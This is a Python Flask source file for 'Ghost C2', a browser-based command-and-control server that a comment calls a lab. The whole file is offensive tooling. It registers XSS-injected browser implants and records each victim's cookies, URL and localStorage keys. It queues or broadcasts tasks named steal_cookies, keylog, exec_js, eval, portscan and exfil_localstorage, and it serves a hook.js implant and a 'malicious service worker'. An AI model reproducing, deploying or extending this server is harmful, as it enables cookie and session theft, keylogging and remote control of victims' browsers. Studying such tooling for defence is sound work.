"""
Ghost C2 — Lightweight browser-based Command & Control server.
All logic lives here. The implant is just a dumb HTTP polling loop.
"""

import time
import uuid
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, render_template
from flask_cors import CORS

app = Flask(__name__, static_folder="static", template_folder="templates")
CORS(app)  # Allow cross-origin — the implant will call from victim origin

# ─── In-memory state ───────────────────────────────────────────────
# Production C2 would use a DB. This is a lab.
agents = {}       # agent_id -> {info, last_seen, tasks, results}
task_queue = {}   # agent_id -> [list of pending tasks]
results = []      # All results across all agents
event_log = []    # Timeline of events


def log_event(event_type, agent_id=None, detail=""):
    entry = {
        "ts": datetime.utcnow().isoformat() + "Z",
        "type": event_type,
        "agent": agent_id,
        "detail": detail
    }
    event_log.append(entry)
    print(f"[{entry['ts']}] [{event_type}] agent={agent_id} {detail}")


# ─── Implant endpoints ────────────────────────────────────────────

@app.route("/api/register", methods=["POST"])
def register():
    """New implant checks in. Assigns agent ID, stores fingerprint."""
    data = request.get_json(silent=True) or {}
    agent_id = str(uuid.uuid4())[:8]

    agents[agent_id] = {
        "id": agent_id,
        "registered": datetime.utcnow().isoformat() + "Z",
        "last_seen": datetime.utcnow().isoformat() + "Z",
        "info": {
            "user_agent": data.get("user_agent", request.headers.get("User-Agent", "")),
            "url": data.get("url", ""),
            "cookies": data.get("cookies", ""),
            "screen": data.get("screen", ""),
            "language": data.get("language", ""),
            "platform": data.get("platform", ""),
            "referrer": data.get("referrer", ""),
            "local_storage_keys": data.get("local_storage_keys", []),
        },
        "results": []
    }
    task_queue[agent_id] = []

    log_event("REGISTER", agent_id, f"url={data.get('url', '?')} ua={data.get('user_agent', '?')[:60]}")

    return jsonify({"agent_id": agent_id, "interval": 3000})


@app.route("/api/task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    """Implant polls for next task. Returns one task or noop."""
    if agent_id not in agents:
        return jsonify({"error": "unknown agent"}), 404

    agents[agent_id]["last_seen"] = datetime.utcnow().isoformat() + "Z"

    if task_queue.get(agent_id):
        task = task_queue[agent_id].pop(0)
        log_event("TASK_SENT", agent_id, f"type={task['type']}")
        return jsonify(task)

    return jsonify({"type": "noop"})


@app.route("/api/result", methods=["POST"])
def post_result():
    """Implant sends back task result."""
    data = request.get_json(silent=True) or {}
    agent_id = data.get("agent_id", "unknown")

    result_entry = {
        "ts": datetime.utcnow().isoformat() + "Z",
        "agent_id": agent_id,
        "task_type": data.get("task_type", ""),
        "data": data.get("data", {})
    }
    results.append(result_entry)

    if agent_id in agents:
        agents[agent_id]["results"].append(result_entry)
        agents[agent_id]["last_seen"] = datetime.utcnow().isoformat() + "Z"

    log_event("RESULT", agent_id, f"type={data.get('task_type', '?')} size={len(json.dumps(data.get('data', {})))}")

    return jsonify({"status": "ok"})


# ─── Operator endpoints (the C2 panel) ────────────────────────────

@app.route("/")
def dashboard():
    """Operator dashboard."""
    return render_template("dashboard.html")


@app.route("/panel/agents", methods=["GET"])
def list_agents():
    """List all registered agents."""
    agent_list = []
    for aid, info in agents.items():
        agent_list.append({
            "id": aid,
            "registered": info["registered"],
            "last_seen": info["last_seen"],
            "url": info["info"].get("url", ""),
            "platform": info["info"].get("platform", ""),
            "pending_tasks": len(task_queue.get(aid, [])),
            "results_count": len(info["results"])
        })
    return jsonify(agent_list)


@app.route("/panel/agent/<agent_id>", methods=["GET"])
def agent_detail(agent_id):
    """Full detail on one agent."""
    if agent_id not in agents:
        return jsonify({"error": "not found"}), 404
    return jsonify(agents[agent_id])


@app.route("/panel/agent/<agent_id>/results", methods=["GET"])
def agent_results(agent_id):
    """All results for an agent."""
    if agent_id not in agents:
        return jsonify({"error": "not found"}), 404
    return jsonify(agents[agent_id]["results"])


@app.route("/panel/task", methods=["POST"])
def queue_task():
    """Operator queues a task for an agent.

    POST body:
    {
        "agent_id": "abc123",
        "type": "exec_js | steal_cookies | keylog | portscan | screenshot | exfil_localstorage | inject_html | eval",
        "payload": { ... type-specific data ... }
    }
    """
    data = request.get_json(silent=True) or {}
    agent_id = data.get("agent_id")

    if agent_id not in agents:
        return jsonify({"error": "unknown agent"}), 404

    task = {
        "task_id": str(uuid.uuid4())[:8],
        "type": data.get("type", "noop"),
        "payload": data.get("payload", {})
    }

    task_queue.setdefault(agent_id, []).append(task)
    log_event("TASK_QUEUED", agent_id, f"type={task['type']} task_id={task['task_id']}")

    return jsonify({"status": "queued", "task_id": task["task_id"]})


@app.route("/panel/task/broadcast", methods=["POST"])
def broadcast_task():
    """Send a task to ALL active agents."""
    data = request.get_json(silent=True) or {}
    task_type = data.get("type", "noop")
    payload = data.get("payload", {})
    count = 0

    for agent_id in agents:
        task = {
            "task_id": str(uuid.uuid4())[:8],
            "type": task_type,
            "payload": payload
        }
        task_queue.setdefault(agent_id, []).append(task)
        count += 1

    log_event("BROADCAST", detail=f"type={task_type} agents={count}")
    return jsonify({"status": "broadcast", "agents_targeted": count})


@app.route("/panel/results", methods=["GET"])
def all_results():
    """All results across all agents."""
    return jsonify(results[-100:])  # Last 100


@app.route("/panel/events", methods=["GET"])
def get_events():
    """Event timeline."""
    return jsonify(event_log[-200:])


# ─── Implant delivery ─────────────────────────────────────────────

@app.route("/hook.js")
def serve_hook():
    """Serve the implant. This is what gets injected via XSS."""
    return send_from_directory("static", "hook.js", mimetype="application/javascript")


@app.route("/sw.js")
def serve_sw():
    """Serve the malicious service worker. Must be at root scope."""
    return send_from_directory("static", "sw.js", mimetype="application/javascript")


if __name__ == "__main__":
    print("=" * 60)
    print("  GHOST C2 — Browser-Based Command & Control")
    print("  Dashboard: http://0.0.0.0:5000/")
    print("  Hook URL:  http://<C2_IP>:5000/hook.js")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=True)
